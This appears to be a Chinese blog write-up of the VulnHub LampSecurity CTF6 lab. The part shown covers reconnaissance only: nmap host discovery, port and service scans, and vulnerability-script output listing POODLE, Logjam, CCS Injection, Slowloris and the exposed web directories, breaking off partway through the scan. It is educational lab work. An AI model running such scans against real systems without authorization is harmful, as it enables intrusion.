<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[vulnhub]  LampSec-CTF6 | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.7.0/styles/default.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"><link rel="stylesheet" href="/css/prism-duotone-dark.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[vulnhub]  LampSec-CTF6</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-05-23T16:29:19.562Z" id="date"> 2023-05-24</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-05-23T16:34:40.995Z" id="updated"> 2023-05-24</time></div></span><br><span>Word Count: <div class="control">14.4k</div></span><br><span>Read Time: <div class="control">86 min</div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='/pic/a12e8f918e3acbe34456729a5f6bb2ca34144840.jpg'><img src="/pic/a12e8f918e3acbe34456729a5f6bb2ca34144840.jpg" alt="a12e8f918e3acbe34456729a5f6bb2ca34144840"></p>
<span id="more"></span>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>主机发现</p>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/LampSecurity/ctf6/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> nmap -sn 192.168.56.0/24         
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> kali: 
Starting Nmap 7.93 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-04-28 11:02 CST
Nmap scan report <span class="token keyword">for</span> 192.168.56.1
Host is up <span class="token punctuation">(</span>0.00020s latency<span class="token punctuation">)</span>.
MAC Address: 00:50:56:C0:00:08 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Nmap scan report <span class="token keyword">for</span> 192.168.56.2
Host is up <span class="token punctuation">(</span>0.00023s latency<span class="token punctuation">)</span>.
MAC Address: 00:50:56:EC:CE:9E <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Nmap scan report <span class="token keyword">for</span> 192.168.56.140
Host is up <span class="token punctuation">(</span>0.00046s latency<span class="token punctuation">)</span>.
MAC Address: 00:0C:29:5C:75:70 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Nmap scan report <span class="token keyword">for</span> 192.168.56.254
Host is up <span class="token punctuation">(</span>0.00021s latency<span class="token punctuation">)</span>.
MAC Address: 00:50:56:FE:21:A5 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Nmap scan report <span class="token keyword">for</span> 192.168.56.132
Host is up.
Nmap done: 256 IP addresses <span class="token punctuation">(</span>5 hosts up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 4.06 seconds
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>端口扫描</p>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/LampSecurity/ctf6/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> nmap -p- --min-rate<span class="token operator">=</span>10000 192.168.56.140
Starting Nmap 7.93 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-04-28 11:03 CST
Nmap scan report <span class="token keyword">for</span> 192.168.56.140
Host is up <span class="token punctuation">(</span>0.0026s latency<span class="token punctuation">)</span>.
Not shown: 65525 closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT     STATE SERVICE
22/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>
80/tcp   <span class="token function">open</span>  http
110/tcp  <span class="token function">open</span>  pop3
111/tcp  <span class="token function">open</span>  rpcbind
143/tcp  <span class="token function">open</span>  imap
443/tcp  <span class="token function">open</span>  https
624/tcp  <span class="token function">open</span>  cryptoadmin
993/tcp  <span class="token function">open</span>  imaps
995/tcp  <span class="token function">open</span>  pop3s
3306/tcp <span class="token function">open</span>  mysql
MAC Address: 00:0C:29:5C:75:70 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>

Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 5.68 seconds
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>UDP端口扫描</p>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/LampSecurity/ctf6/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> nmap -sU -p- --min-rate<span class="token operator">=</span>10000 192.168.56.140
Starting Nmap 7.93 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-04-28 11:06 CST
Warning: 192.168.56.140 giving up on port because retransmission cap hit <span class="token punctuation">(</span>10<span class="token punctuation">)</span>.
Stats: 0:00:37 elapsed<span class="token punctuation">;</span> 0 hosts completed <span class="token punctuation">(</span>1 up<span class="token punctuation">)</span>, 1 undergoing UDP Scan
UDP Scan Timing: About 52.44% <span class="token keyword">done</span><span class="token punctuation">;</span> ETC: 11:08 <span class="token punctuation">(</span>0:00:34 remaining<span class="token punctuation">)</span>
Nmap scan report <span class="token keyword">for</span> 192.168.56.140
Host is up <span class="token punctuation">(</span>0.0026s latency<span class="token punctuation">)</span>.
Not shown: 65453 <span class="token function">open</span><span class="token operator">|</span>filtered udp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>, 81 closed udp ports <span class="token punctuation">(</span>port-unreach<span class="token punctuation">)</span>
PORT    STATE SERVICE
111/udp <span class="token function">open</span>  rpcbind
MAC Address: 00:0C:29:5C:75:70 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>

Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 72.95 seconds
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>TCP扫描，服务识别，OS识别</p>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/LampSecurity/ctf6/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> nmap -sT -sV -O -p22,80,110,111,143,443,624,993,995,3306 192.168.56.140
Starting Nmap 7.93 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-04-28 11:08 CST
Nmap scan report <span class="token keyword">for</span> 192.168.56.140
Host is up <span class="token punctuation">(</span>0.00049s latency<span class="token punctuation">)</span>.

PORT     STATE SERVICE  VERSION
22/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>      OpenSSH 4.3 <span class="token punctuation">(</span>protocol 2.0<span class="token punctuation">)</span>
80/tcp   <span class="token function">open</span>  http     Apache httpd 2.2.3 <span class="token variable"><span class="token punctuation">((</span>CentOS<span class="token punctuation">))</span></span>
110/tcp  <span class="token function">open</span>  pop3     Dovecot pop3d
111/tcp  <span class="token function">open</span>  rpcbind  2 <span class="token punctuation">(</span>RPC <span class="token comment" spellcheck="true">#100000)</span>
143/tcp  <span class="token function">open</span>  imap     Dovecot imapd
443/tcp  <span class="token function">open</span>  ssl/http Apache httpd 2.2.3 <span class="token variable"><span class="token punctuation">((</span>CentOS<span class="token punctuation">))</span></span>
624/tcp  <span class="token function">open</span>  status   1 <span class="token punctuation">(</span>RPC <span class="token comment" spellcheck="true">#100024)</span>
993/tcp  <span class="token function">open</span>  ssl/imap Dovecot imapd
995/tcp  <span class="token function">open</span>  ssl/pop3 Dovecot pop3d
3306/tcp <span class="token function">open</span>  mysql    MySQL 5.0.45
MAC Address: 00:0C:29:5C:75:70 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least 1 <span class="token function">open</span> and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token keyword">.</span>
Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 14.60 seconds
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可用信息很多。反正还是先从80看起吧。</p>
<p>漏洞扫描</p>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/LampSecurity/ctf6/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> nmap --script<span class="token operator">=</span>vuln 192.168.56.140                                      
Starting Nmap 7.93 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-04-28 11:10 CST
Nmap scan report <span class="token keyword">for</span> 192.168.56.140
Host is up <span class="token punctuation">(</span>0.0028s latency<span class="token punctuation">)</span>.
Not shown: 991 closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT     STATE SERVICE
22/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>
80/tcp   <span class="token function">open</span>  http
<span class="token operator">|</span> http-enum: 
<span class="token operator">|</span>   /mail/: Mail folder
<span class="token operator">|</span>   /logs/: Logs <span class="token punctuation">(</span>401 Authorization Required<span class="token punctuation">)</span>
<span class="token operator">|</span>   /phpmyadmin/: phpMyAdmin
<span class="token operator">|</span>   /css/: Potentially interesting directory w/ listing on <span class="token string">'apache/2.2.3 (centos)'</span>
<span class="token operator">|</span>   /docs/: Potentially interesting directory w/ listing on <span class="token string">'apache/2.2.3 (centos)'</span>
<span class="token operator">|</span>   /files/: Potentially interesting directory w/ listing on <span class="token string">'apache/2.2.3 (centos)'</span>
<span class="token operator">|</span>   /icons/: Potentially interesting directory w/ listing on <span class="token string">'apache/2.2.3 (centos)'</span>
<span class="token operator">|</span>   /inc/: Potentially interesting directory w/ listing on <span class="token string">'apache/2.2.3 (centos)'</span>
<span class="token operator">|</span>   /js/: Potentially interesting directory w/ listing on <span class="token string">'apache/2.2.3 (centos)'</span>
<span class="token operator">|</span>   /lib/: Potentially interesting directory w/ listing on <span class="token string">'apache/2.2.3 (centos)'</span>
<span class="token operator">|</span>   /manual/: Potentially interesting folder
<span class="token operator">|</span>   /sql/: Potentially interesting directory w/ listing on <span class="token string">'apache/2.2.3 (centos)'</span>
<span class="token operator">|</span>_  /templates/: Potentially interesting directory w/ listing on <span class="token string">'apache/2.2.3 (centos)'</span>
<span class="token operator">|</span> http-slowloris-check: 
<span class="token operator">|</span>   VULNERABLE:
<span class="token operator">|</span>   Slowloris DOS attack
<span class="token operator">|</span>     State: LIKELY VULNERABLE
<span class="token operator">|</span>     IDs:  CVE:CVE-2007-6750
<span class="token operator">|</span>       Slowloris tries to keep many connections to the target web server <span class="token function">open</span> and hold
<span class="token operator">|</span>       them <span class="token function">open</span> as long as possible.  It accomplishes this by opening connections to
<span class="token operator">|</span>       the target web server and sending a partial request. By doing so, it starves
<span class="token operator">|</span>       the http server<span class="token string">'s resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-dombased-xss: Couldn'</span>t <span class="token function">find</span> any DOM based XSS.
<span class="token operator">|</span>_http-stored-xss: Couldn<span class="token string">'t find any stored XSS vulnerabilities.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.140
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.56.140:80/?action=login
|     Form id: 
|     Form action: ?action=login
|     
|     Path: http://192.168.56.140:80/mail/
|     Form id: rcmlogintz
|_    Form action: ./
|_http-trace: TRACE is enabled
110/tcp  open  pop3
| ssl-dh-params: 
|   VULNERABLE:
|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use anonymous
|       Diffie-Hellman key exchange only provide protection against passive
|       eavesdropping, and are vulnerable to active man-in-the-middle attacks
|       which could completely compromise the confidentiality and integrity
|       of any data exchanged over the resulting session.
|     Check results:
|       ANONYMOUS DH GROUP 1
|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 512
|             Generator Length: 8
|             Public Key Length: 512
|     References:
|       https://www.ietf.org/rfc/rfc2246.txt
|   
|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2015-4000  BID:74733
|       The Transport Layer Security (TLS) protocol contains a flaw that is
|       triggered when handling Diffie-Hellman key exchanges defined with
|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker
|       to downgrade the security of a TLS session to 512-bit export-grade
|       cryptography, which is significantly weaker, allowing the attacker
|       to more easily break the encryption and monitor or tamper with
|       the encrypted stream.
|     Disclosure date: 2015-5-19
|     Check results:
|       EXPORT-GRADE DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 512
|             Generator Length: 8
|             Public Key Length: 512
|     References:
|       https://weakdh.org
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000
|       https://www.securityfocus.com/bid/74733
|   
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|       http://www.cvedetails.com/cve/2014-0224
|_      http://www.openssl.org/news/secadv_20140605.txt
|_sslv2-drown: ERROR: Script execution failed (use -d to debug)
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  CVE:CVE-2014-3566  BID:70574
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|_      https://www.securityfocus.com/bid/70574
111/tcp  open  rpcbind
143/tcp  open  imap
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|       http://www.cvedetails.com/cve/2014-0224
|_      http://www.openssl.org/news/secadv_20140605.txt
|_sslv2-drown: ERROR: Script execution failed (use -d to debug)
| ssl-dh-params: 
|   VULNERABLE:
|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use anonymous
|       Diffie-Hellman key exchange only provide protection against passive
|       eavesdropping, and are vulnerable to active man-in-the-middle attacks
|       which could completely compromise the confidentiality and integrity
|       of any data exchanged over the resulting session.
|     Check results:
|       ANONYMOUS DH GROUP 1
|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 512
|             Generator Length: 8
|             Public Key Length: 512
|     References:
|       https://www.ietf.org/rfc/rfc2246.txt
|   
|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2015-4000  BID:74733
|       The Transport Layer Security (TLS) protocol contains a flaw that is
|       triggered when handling Diffie-Hellman key exchanges defined with
|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker
|       to downgrade the security of a TLS session to 512-bit export-grade
|       cryptography, which is significantly weaker, allowing the attacker
|       to more easily break the encryption and monitor or tamper with
|       the encrypted stream.
|     Disclosure date: 2015-5-19
|     Check results:
|       EXPORT-GRADE DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 512
|             Generator Length: 8
|             Public Key Length: 512
|     References:
|       https://weakdh.org
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000
|       https://www.securityfocus.com/bid/74733
|   
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  CVE:CVE-2014-3566  BID:70574
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|_      https://www.securityfocus.com/bid/70574
443/tcp  open  https
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  CVE:CVE-2014-3566  BID:70574
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|_      https://www.securityfocus.com/bid/70574
|_http-stored-xss: Couldn'</span>t <span class="token function">find</span> any stored XSS vulnerabilities.
<span class="token operator">|</span> ssl-dh-params: 
<span class="token operator">|</span>   VULNERABLE:
<span class="token operator">|</span>   Diffie-Hellman Key Exchange Insufficient Group Strength
<span class="token operator">|</span>     State: VULNERABLE
<span class="token operator">|</span>       Transport Layer Security <span class="token punctuation">(</span>TLS<span class="token punctuation">)</span> services that use Diffie-Hellman <span class="token function">groups</span>
<span class="token operator">|</span>       of insufficient strength, especially those using one of a few commonly
<span class="token operator">|</span>       shared groups, may be susceptible to passive eavesdropping attacks.
<span class="token operator">|</span>     Check results:
<span class="token operator">|</span>       WEAK DH GROUP 1
<span class="token operator">|</span>             Cipher Suite: TLS_DHE_RSA_WITH_DES_CBC_SHA
<span class="token operator">|</span>             Modulus Type: Safe prime
<span class="token operator">|</span>             Modulus Source: mod_ssl 2.2.x/1024-bit MODP group with safe prime modulus
<span class="token operator">|</span>             Modulus Length: 1024
<span class="token operator">|</span>             Generator Length: 8
<span class="token operator">|</span>             Public Key Length: 1024
<span class="token operator">|</span>     References:
<span class="token operator">|</span>_      https://weakdh.org
<span class="token operator">|</span>_http-vuln-cve2017-1001000: ERROR: Script execution failed <span class="token punctuation">(</span>use -d to debug<span class="token punctuation">)</span>
<span class="token operator">|</span> ssl-ccs-injection: 
<span class="token operator">|</span>   VULNERABLE:
<span class="token operator">|</span>   SSL/TLS MITM vulnerability <span class="token punctuation">(</span>CCS Injection<span class="token punctuation">)</span>
<span class="token operator">|</span>     State: VULNERABLE
<span class="token operator">|</span>     Risk factor: High
<span class="token operator">|</span>       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
<span class="token operator">|</span>       does not properly restrict processing of ChangeCipherSpec messages,
<span class="token operator">|</span>       <span class="token function">which</span> allows man-in-the-middle attackers to trigger use of a zero
<span class="token operator">|</span>       length master key <span class="token keyword">in</span> certain OpenSSL-to-OpenSSL communications, and
<span class="token operator">|</span>       consequently hijack sessions or obtain sensitive information, via
<span class="token operator">|</span>       a crafted TLS handshake, aka the <span class="token string">"CCS Injection"</span> vulnerability.
<span class="token operator">|</span>           
<span class="token operator">|</span>     References:
<span class="token operator">|</span>       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="token operator">=</span>CVE-2014-0224
<span class="token operator">|</span>       http://www.cvedetails.com/cve/2014-0224
<span class="token operator">|</span>_      http://www.openssl.org/news/secadv_20140605.txt
<span class="token operator">|</span>_http-dombased-xss: Couldn<span class="token string">'t find any DOM based XSS.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.140
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: https://192.168.56.140:443/mail/
|     Form id: rcmlogintz
|     Form action: ./
|     
|     Path: https://192.168.56.140:443/?action=login
|     Form id: 
|     Form action: ?action=login
|     
|     Path: https://192.168.56.140:443/mail/?_task=mail
|     Form id: rcmlogintz
|_    Form action: ./
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server'</span>s resources causing Denial Of Service.
<span class="token operator">|</span>       
<span class="token operator">|</span>     Disclosure date: 2009-09-17
<span class="token operator">|</span>     References:
<span class="token operator">|</span>       http://ha.ckers.org/slowloris/
<span class="token operator">|</span>_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="token operator">=</span>CVE-2007-6750
<span class="token operator">|</span> http-cookie-flags: 
<span class="token operator">|</span>   /: 
<span class="token operator">|</span>     PHPSESSID: 
<span class="token operator">|</span>       secure flag not <span class="token keyword">set</span> and HTTPS <span class="token keyword">in</span> use
<span class="token operator">|</span>_      httponly flag not <span class="token keyword">set</span>
<span class="token operator">|</span>_http-trace: TRACE is enabled
<span class="token operator">|</span>_http-phpself-xss: ERROR: Script execution failed <span class="token punctuation">(</span>use -d to debug<span class="token punctuation">)</span>
<span class="token operator">|</span> http-enum: 
<span class="token operator">|</span>   /mail/: Mail folder
<span class="token operator">|</span>   /logs/: Logs <span class="token punctuation">(</span>401 Authorization Required<span class="token punctuation">)</span>
<span class="token operator">|</span>   /phpmyadmin/: phpMyAdmin
<span class="token operator">|</span>   /css/: Potentially interesting directory w/ listing on <span class="token string">'apache/2.2.3 (centos)'</span>
<span class="token operator">|</span>   /docs/: Potentially interesting directory w/ listing on <span class="token string">'apache/2.2.3 (centos)'</span>
<span class="token operator">|</span>   /files/: Potentially interesting directory w/ listing on <span class="token string">'apache/2.2.3 (centos)'</span>
<span class="token operator">|</span>   /icons/: Potentially interesting directory w/ listing on <span class="token string">'apache/2.2.3 (centos)'</span>
<span class="token operator">|</span>   /inc/: Potentially interesting directory w/ listing on <span class="token string">'apache/2.2.3 (centos)'</span>
<span class="token operator">|</span>   /js/: Potentially interesting directory w/ listing on <span class="token string">'apache/2.2.3 (centos)'</span>
<span class="token operator">|</span>   /lib/: Potentially interesting directory w/ listing on <span class="token string">'apache/2.2.3 (centos)'</span>
<span class="token operator">|</span>   /manual/: Potentially interesting folder
<span class="token operator">|</span>   /sql/: Potentially interesting directory w/ listing on <span class="token string">'apache/2.2.3 (centos)'</span>
<span class="token operator">|</span>_  /templates/: Potentially interesting directory w/ listing on <span class="token string">'apache/2.2.3 (centos)'</span>
993/tcp  <span class="token function">open</span>  imaps
<span class="token operator">|</span>_sslv2-drown: ERROR: Script execution failed <span class="token punctuation">(</span>use -d to debug<span class="token punctuation">)</span>
<span class="token operator">|</span> ssl-poodle: 
<span class="token operator">|</span>   VULNERABLE:
<span class="token operator">|</span>   SSL POODLE information leak
<span class="token operator">|</span>     State: VULNERABLE
<span class="token operator">|</span>     IDs:  CVE:CVE-2014-3566  BID:70574
